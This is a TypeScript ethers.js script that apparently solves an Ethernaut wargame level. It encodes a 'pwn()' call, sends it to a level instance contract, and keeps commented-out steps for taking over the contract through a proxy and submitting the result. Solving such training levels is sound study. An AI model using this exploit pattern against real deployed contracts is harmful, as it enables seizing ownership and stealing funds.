import { ethers } from "ethers";
import { getSigner } from "./signer";

import { BigNumber, BytesLike } from "ethers";
import { Interface } from "ethers/lib/utils";
import { ProxyCall__factory } from "../typechain";


import { ProxyCall } from "../typechain/ProxyCall";
async function main() {
  const instanceAddress = "0xa35dc493746bEB48655F75255B83A6171f234695";
  const signer = getSigner();
  const signerAddress = await signer.getAddress();
  const smallEtherValue = 10000000;

  // const proxy = await factory.deploy() as ProxyCall
  const proxy = ProxyCall__factory.connect("0x682Fc3f0384b0f464415feC28b233764CeB88d3a", signer)
  await proxy.deployed();

  const iface = new Interface([
    "function pwn()",
  ]);
  // this actually require proxy contract. only contract call external method
  const maliciousCall: BytesLike = iface.encodeFunctionData("pwn", []);
  console.log(maliciousCall)

  // send some money to contract first.
  await (await signer.sendTransaction({to:instanceAddress,  data:maliciousCall, gasLimit:852000})).wait();
  // take over another contract through proxy.
  // await (await proxy.proxy( instanceAddress ,maliciousCall, {gasLimit:620000 })).wait();
  // await (await signer.sendTransaction({ gasLimit: 620000, to: instanceAddress, data: maliciousCall, value: smallEtherValue })).wait();

  // // proxy send result to ethernaut. Because it is owner.
  // const tx = await proxy.proxy("0xd991431d8b033ddcb84dad257f4821e9d5b38c33", "0xc882d7c2000000000000000000000000a35dc493746beb48655f75255b83a6171f234695", {gasLimit:620000});
  // console.log(tx)
  // const receipt = await tx.wait();
  // console.log(receipt);

}
main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });
